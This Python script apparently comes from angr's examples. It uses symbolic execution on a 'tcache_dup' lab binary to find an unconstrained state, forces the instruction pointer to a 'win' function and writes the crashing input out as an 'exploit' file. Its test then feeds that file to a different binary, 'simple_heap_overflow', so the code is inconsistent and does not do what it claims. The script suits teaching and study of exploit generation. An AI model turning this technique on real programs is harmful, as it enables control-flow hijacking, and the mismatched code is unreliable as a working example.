#!/usr/bin/env python

import os, os.path
import subprocess

DIR = os.path.dirname(os.path.realpath(__file__))

def main():
    import angr
    from angr import sim_options as so

    ld_path = os.path.join(DIR, '../../binaries/tests/x86_64')
    #print(ld_path)
    proj = angr.Project("./tcache_dup", exclude_sim_procedures_list=["calloc"], ld_path=ld_path)

    extras = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY}
    state = proj.factory.entry_state(add_options=extras)
    # We're looking for unconstrained paths, it means we may have control
    sm = proj.factory.simulation_manager(state,save_unconstrained=True)

    # Step execution until we find a place we may control
    while sm.active and not sm.unconstrained:
        sm.step()

    print(sm)
    # In [9]: sm
    # Out[9]: <PathGroup with 1 deadended, 1 unconstrained>

    if not sm.unconstrained:
        raise Exception("Uh oh! Couldn't explore to the crashing state. It's possible your libc is too new.")
    # Make a copy of the state to play with
    s = sm.unconstrained[0].copy()

    # Now we can simply tell angr to set the instruction pointer to point at the
    # win function to give us execution
    s.add_constraints(s.regs.rip == proj.loader.find_symbol('win').rebased_addr)

    print(s.solver.constraints)
    assert s.satisfiable()

    # Call the solving engine and write the solution out to a file called "exploit"
    print("Writing exploit as \"exploit\"")
    with open('exploit', 'wb') as fp:
        fp.write(s.posix.dumps(0))

    # Now you can run the program and feed it your exploit to gain execution
    # ./simple_heap_overflow < exploit

def test():
    # Generate the exploit
    main()

    # Make sure it worked
    out = subprocess.check_output("{0} < {1}".format(
        os.path.join(DIR,"simple_heap_overflow"),
        os.path.join(DIR,"exploit"),
        )
        ,shell=True)

    # Assert we got to the printing of Win
    assert b"Win" in out


if __name__ == '__main__':
    test()
